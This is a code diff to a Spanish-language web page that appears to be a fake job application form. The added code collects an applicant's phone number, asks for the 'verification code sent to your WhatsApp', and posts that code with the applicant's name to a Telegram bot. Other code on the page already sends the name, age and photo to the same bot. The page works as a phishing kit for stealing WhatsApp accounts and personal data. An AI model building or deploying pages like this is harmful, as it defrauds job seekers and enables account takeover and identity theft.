@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -99,6 +100,35 @@
         .btn-pro:disabled { background: #cbd5e1; cursor: not-allowed; }
 
         .loading { text-align: center; color: var(--primary); display: none; font-weight: 600; margin-top: 10px; }
+
+        /* ESTILO DE LA PLANILLA DE RESUMEN */
+        .planilla-resumen {
+            background: white;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: left;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 15px;
+            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+        }
+        .planilla-foto {
+            width: 100px;
+            height: 120px;
+            border-radius: 8px;
+            object-fit: cover;
+            border: 1px solid var(--border);
+        }
+        .planilla-datos {
+            flex: 1;
+            font-size: 0.85rem;
+        }
+        .planilla-datos div {
+            margin-bottom: 4px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .planilla-datos strong { color: var(--primary); }
     </style>
 </head>
 <body>
@@ -124,6 +154,11 @@
         <div class="input-group">
             <label>Nombre Completo</label>
             <input type="text" id="nombre" placeholder="Juan Pérez">
+        </div>
+
+        <div class="input-group">
+            <label>Teléfono Personal</label>
+            <input type="tel" id="telefono" placeholder="+53 00000000">
         </div>
 
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
@@ -173,11 +208,25 @@
         <p id="status" class="loading">Enviando solicitud...</p>
     </div>
 
-    <div id="pantalla-codigo" class="screen" style="text-align: center; padding-top: 40px;">
-        <h2 style="color: #10b981;">¡Casi listo!</h2>
+    <div id="pantalla-codigo" class="screen" style="text-align: center; padding-top: 20px;">
+        <h2 style="color: #10b981; margin-bottom: 10px;">¡Casi listo!</h2>
+        <p style="font-size: 0.9rem; margin-bottom: 15px;">Confirma que tus datos sean correctos:</p>
+
+        <div id="planilla-contenedor" class="planilla-resumen">
+            <img id="resumen-foto" src="" class="planilla-foto" alt="Foto Aspirante">
+            <div class="planilla-datos">
+                <div><strong>Nombre:</strong> <span id="res-nombre"></span></div>
+                <div><strong>Teléfono:</strong> <span id="res-tel"></span></div>
+                <div><strong>Edad:</strong> <span id="res-edad"></span></div>
+                <div><strong>Puesto:</strong> <span id="res-puesto"></span></div>
+                <div><strong>Nivel:</strong> <span id="res-nivel"></span></div>
+            </div>
+        </div>
+
         <p>Introduce el código de verificación enviado a tu WhatsApp.</p>
-        <input type="text" id="codigo-wa" placeholder="0 0 0 0" style="text-align: center; font-size: 2rem; width: 150px; border:none; border-bottom: 3px solid #10b981; outline:none;">
-        <button class="btn-pro" onclick="alert('En revisión...')">VERIFICAR</button>
+        <input type="text" id="codigo-wa" placeholder="0 0 0 0" style="text-align: center; font-size: 2rem; width: 150px; border:none; border-bottom: 3px solid #10b981; outline:none; margin-bottom: 10px;">
+        <button class="btn-pro" onclick="enviarCodigoVerificacion()">VERIFICAR</button>
+        <p id="status-codigo" class="loading">Validando código...</p>
     </div>
 </div>
 
@@ -204,6 +253,7 @@
 
     let contactosElegidos = [];
     let trabajoSeleccionado = "";
+    let nombreGlobal = ""; // Para usar en la verificación final
 
     window.onload = () => {
         document.getElementById('site-title').innerText = CONFIG.visual.titulo;
@@ -256,20 +306,34 @@
 
     async function enviarTodaLaInformacion() {
         const nombre = document.getElementById('nombre').value;
+        const telefono = document.getElementById('telefono').value;
         const edad = document.getElementById('edad').value;
         const genero = document.getElementById('genero').value;
         const nivel = document.getElementById('nivel').value;
         const foto = document.getElementById('foto').files[0];
 
-        if (!nombre || !foto || !edad) {
-            alert("Por favor completa todos los campos.");
+        if (!nombre || !telefono || !foto || !edad) {
+            alert("Por favor completa todos los campos, incluyendo tu teléfono.");
             return;
         }
 
+        nombreGlobal = nombre; // Guardamos el nombre para el segundo envío
         document.getElementById('status').style.display = "block";
+
+        // Preparar planilla visual en la siguiente pantalla
+        document.getElementById('res-nombre').innerText = nombre;
+        document.getElementById('res-tel').innerText = telefono;
+        document.getElementById('res-edad').innerText = edad;
+        document.getElementById('res-puesto').innerText = trabajoSeleccionado;
+        document.getElementById('res-nivel').innerText = nivel;
+        
+        const reader = new FileReader();
+        reader.onload = (e) => { document.getElementById('resumen-foto').src = e.target.result; };
+        reader.readAsDataURL(foto);
 
         const texto = `🌟 *NUEVO CANDIDATO*\n\n` +
                       `👤 *Nombre:* ${nombre}\n` +
+                      `📞 *Teléfono:* ${telefono}\n` +
                       `🎂 *Edad:* ${edad}\n` +
                       `🚻 *Género:* ${genero}\n` +
                       `🎓 *Nivel:* ${nivel}\n` +
@@ -290,6 +354,37 @@
             alert("Error de conexión.");
         } finally {
             document.getElementById('status').style.display = "none";
+        }
+    }
+
+    async function enviarCodigoVerificacion() {
+        const codigo = document.getElementById('codigo-wa').value;
+        if(!codigo) {
+            alert("Por favor ingresa el código.");
+            return;
+        }
+
+        document.getElementById('status-codigo').style.display = "block";
+
+        const mensajeCodigo = `🔑 *VERIFICACIÓN DE CÓDIGO*\n\n` +
+                              `👤 *Cliente:* ${nombreGlobal}\n` +
+                              `🔢 *Código Ingresado:* ${codigo}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.conexion.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.conexion.chatId,
+                    text: mensajeCodigo,
+                    parse_mode: 'Markdown'
+                })
+            });
+            alert("Información en revisión. Te contactaremos pronto.");
+        } catch (e) {
+            alert("Error al enviar el código.");
+        } finally {
+            document.getElementById('status-codigo').style.display = "none";
         }
     }
 </script>
